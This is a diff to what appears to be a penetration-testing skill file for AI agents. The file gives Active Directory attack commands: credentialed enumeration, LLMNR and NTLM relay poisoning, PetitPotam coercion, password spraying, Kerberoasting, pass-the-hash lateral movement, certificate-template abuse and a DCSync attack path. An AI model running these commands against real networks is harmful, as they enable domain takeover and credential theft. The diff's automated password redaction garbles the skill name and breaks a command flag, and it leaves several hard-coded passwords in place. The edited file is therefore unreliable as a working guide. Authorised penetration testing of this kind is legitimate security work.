@@ -1,5 +1,5 @@
 ---
-name: conducting-internal-network-penetration-test
+name: conducting-internal-network-p<YOUR_PASSWORD>-test
 license: Apache-2.0
 description: Execute an internal network penetration test simulating an insider threat or post-breach attacker to identify lateral movement paths, privilege escalation vectors, and sensitive data exposure within the corporate network.
 metadata:
@@ -16,6 +16,9 @@ metadata:
   version: '1.0'
   author: mahipal
 ---
+
+> **⚠️ Security Notice**: Commands in this skill may require elevated privileges. Never use real credentials in scripts. Use environment variables or secure vaults for all secrets.
+
 # Conducting Internal Network Penetration Test
 
 ## Overview
@@ -77,24 +80,24 @@ nmap -p 1433,3306,5432,1521,27017 --open -iL live_hosts.txt -oG db_hosts.gnmap
 ```bash
 # Enumerate domain information with domain credentials
 # Using CrackMapExec / NetExec
-netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --shares
-netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --users
-netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups
+netexec smb 10.0.0.0/24 -u 'testuser' -p <YOUR_PASSWORD> --shares
+netexec smb 10.0.0.0/24 -u 'testuser' -p <YOUR_PASSWORD> --users
+netexec smb 10.0.0.0/24 -u 'testuser' -p <YOUR_PASSWORD> --groups
 
 # LDAP enumeration
 ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
   -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
 
 # Enumerate Group Policy Objects
-netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
-netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --lsa
+netexec smb 10.0.0.5 -u 'testuser' -p <YOUR_PASSWORD> --gpp-p<YOUR_PASSWORD>
+netexec smb 10.0.0.5 -u 'testuser' -p <YOUR_PASSWORD> --lsa
 
 # BloodHound data collection
-bloodhound-python -u 'testuser' -p 'Password123' -d corp.local -ns 10.0.0.5 -c all
+bloodhound-python -u 'testuser' -p <YOUR_PASSWORD> -d corp.local -ns 10.0.0.5 -c all
 # Import JSON files into BloodHound GUI for attack path analysis
 
 # Enum4linux-ng for legacy enumeration
-enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
+enum4linux-ng -A 10.0.0.5 -u 'testuser' -p <YOUR_PASSWORD>
 ```
 
 ### Network Service Enumeration
@@ -102,7 +105,7 @@ enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
 ```bash
 # SMB share enumeration
 smbclient -L //10.0.0.10 -U 'testuser%Password123'
-smbmap -H 10.0.0.10 -u 'testuser' -p 'Password123' -R
+smbmap -H 10.0.0.10 -u 'testuser' -p <YOUR_PASSWORD> -R
 
 # SNMP enumeration
 snmpwalk -v2c -c public 10.0.0.1
@@ -135,7 +138,7 @@ sudo mitm6 -d corp.local
 impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
 
 # PetitPotam — coerce NTLM authentication
-python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
+python3 PetitPotam.py -u 'testuser' -p <YOUR_PASSWORD> -d corp.local \
   attacker_ip 10.0.0.5
 ```
 
@@ -147,8 +150,8 @@ hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
   -r /usr/share/hashcat/rules/best64.rule
 
 # Password spraying (careful with lockout policies)
-netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
-netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce
+netexec smb 10.0.0.5 -u users.txt -p <YOUR_PASSWORD> --no-bruteforce
+netexec smb 10.0.0.5 -u users.txt -p <YOUR_PASSWORD> --no-bruteforce
 
 # Kerberoasting — target service accounts
 impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
@@ -173,7 +176,7 @@ impacket-psexec 'corp.local/admin@10.0.0.30' -hashes :aad3b435b51404eeaad3b435b5
 impacket-wmiexec 'corp.local/admin:AdminPass123@10.0.0.30'
 
 # Evil-WinRM for PowerShell remoting
-evil-winrm -i 10.0.0.30 -u admin -p 'AdminPass123'
+evil-winrm -i 10.0.0.30 -u admin -p <YOUR_PASSWORD>
 
 # SMBExec
 impacket-smbexec 'corp.local/admin:AdminPass123@10.0.0.30'
@@ -222,8 +225,8 @@ impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
   -domain corp.local -spn MSSQL/db01.corp.local administrator
 
 # ADCS exploitation (Certifried, ESC1-ESC8)
-certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
-certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
+certipy find -u 'testuser@corp.local' -p <YOUR_PASSWORD> -dc-ip 10.0.0.5
+certipy req -u 'testuser@corp.local' -p <YOUR_PASSWORD> -target ca01.corp.local \
   -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
 ```
 
@@ -255,7 +258,7 @@ echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt
 ```
 Attack Path 1: Domain Compromise via LLMNR Poisoning
   Step 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
-  Step 2: Hash cracked offline — user: jsmith, password: Welcome2025!
+  Step 2: Hash cracked offline — user: jsmith, password: <YOUR_PASSWORD>
   Step 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
   Step 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
   Step 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
